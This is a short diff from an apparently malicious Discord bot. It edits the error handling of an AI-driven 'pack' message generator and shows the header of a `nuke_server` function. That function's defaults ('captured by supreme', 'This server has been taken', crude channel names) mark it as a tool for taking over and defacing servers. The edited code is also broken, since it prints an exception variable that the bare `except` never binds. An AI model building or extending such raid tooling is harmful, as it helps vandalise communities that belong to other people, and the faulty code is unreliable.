@@ -243,7 +243,8 @@ Respond with only the pack message, no extra text."""
         )
         return resp.choices[0].message.content.strip()
     except:
-        await.message.channel.send("error")
+        print(f"[Pack Generator Error] {e}")
+        return "error"
 
 # ========== NUKE FUNCTION ==========
 async def nuke_server(guild_id, new_name="captured by supreme", description="This server has been taken", channel_prefix="fucked-", channel_count=10):
